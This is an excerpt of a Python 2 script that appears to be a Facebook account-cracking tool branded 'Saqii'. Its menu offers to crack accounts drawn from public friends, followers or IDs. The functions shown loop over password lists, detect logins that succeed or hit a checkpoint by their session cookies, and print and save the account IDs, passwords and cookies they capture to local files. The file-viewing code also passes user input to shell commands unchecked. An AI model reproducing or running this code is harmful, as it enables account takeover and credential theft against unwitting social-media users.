...
def logo():
	os.system("clear")
	print("""\033[1;97m  Saqii tech ...... \033[1;0m
   SSSSSSSSSSSSSSS                                        iiii    iiii  
 SS:::::::::::::::S                                      i::::i  i::::i 
S:::::SSSSSS::::::S                                       iiii    iiii  
S:::::S     SSSSSSS                                                     
S:::::S              aaaaaaaaaaaaa     qqqqqqqqq   qqqqqiiiiiii iiiiiii 
S:::::S              a::::::::::::a   q:::::::::qqq::::qi:::::i i:::::i 
 S::::SSSS           aaaaaaaaa:::::a q:::::::::::::::::q i::::i  i::::i 
  SS::::::SSSSS               a::::aq::::::qqqqq::::::qq i::::i  i::::i 
    SSS::::::::SS      aaaaaaa:::::aq:::::q     q:::::q  i::::i  i::::i 
       SSSSSS::::S   aa::::::::::::aq:::::q     q:::::q  i::::i  i::::i 
            S:::::S a::::aaaa::::::aq:::::q     q:::::q  i::::i  i::::i 
            S:::::Sa::::a    a:::::aq::::::q    q:::::q  i::::i  i::::i 
SSSSSSS     S:::::Sa::::a    a:::::aq:::::::qqqqq:::::q i::::::ii::::::i
S::::::SSSSSS:::::Sa:::::aaaa::::::a q::::::::::::::::q i::::::ii::::::i
S:::::::::::::::SS  a::::::::::aa:::a qq::::::::::::::q i::::::ii::::::i
 SSSSSSSSSSSSSSS     aaaaaaaaaa  aaaa   qqqqqqqq::::::q iiiiiiiiiiiiiiii
                                                q:::::q                 
                                                q:::::q                 
                                               q:::::::q                
                                               q:::::::q                
...
\033[1;93m➤\033[1;97m Author   : Saqii
\033[1;93m➤\033[1;97m Github   : https://github.com/Riazkiller
\033[1;93m➤\033[1;97m YOUTUBE : https://youtu.be/dgtSJAvqsZ4
   SSSSSSSSSSSSSSS                                        iiii    iiii  
 SS:::::::::::::::S                                      i::::i  i::::i 
S:::::SSSSSS::::::S                                       iiii    iiii  
S:::::S     SSSSSSS                                                     
...
def menu():
	...
	print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97m Clone (Saqii)from public friends")
	print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97m Crack (Saqii)from public followers")
	print("\033[1;97m[3]\033[1;91m-⋄-\033[1;97m Multi cracking (Saqii)from public Id\033[1;93m [ \033[1;95mPro \033[1;97m]")
	...
	Saqii = raw_input("\033[1;97m[+]\033[1;91m-⋄-\033[1;97m Option : ")
	if Saqii =="":
		menu()
	elif Saqii == "1" or Saqii == "01":
		publik()
		method()
	elif Saqii == "2" or Saqii == "02":
		follower()
		method()
	elif Saqii == "3" or Saqii == "03":
		massal()
		method()
	elif Saqii == "4" or Saqii == "04":
		print(" ")
		...
		if cek =="":
			...
			try:
				...
				if file == "":
					menu()
				Totalok = open("Saqii/%s"%(file)).read().splitlines()
			except IOError:
			...
			os.system("cat Saqii/%s"%(file))
			print(" \033[0;94m # ----------------------------------------------")
			exit(" ")
		elif cek == "2":
			dirs = os.listdir("tech")
			print("\033[1;96m[\033[1;93m+\033[1;96m] Copy File Name And Past into Input")
			for file in dirs:
				print(" + "+file)
			try:
				...
				if file == "":
					menu()
				Totalcp = open("tech/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			...
			os.system("cat tech/%s"%(file))
			print("\033[0;96m # ----------------------------------------------")
			exit(" ")
		else:
			menu()
	elif Saqii == "5" or Saqii == "05":
		setting_ua()
	elif Saqii == "0" or Saqii == "00":
		os.system("rm -f login.txt")
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;91m[tech-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
			cp.append("%s|%s"%(uid, pw))
			open("tech/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
	except KeyError, IOError:
		day = (" ")
		month = (" ")
		year = (" ")
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;91m[tech-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("tech/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;92m[Saqii-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("Saqii/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[tech-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("tech/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[Saqii-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("Saqii/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[tech-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("tech/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
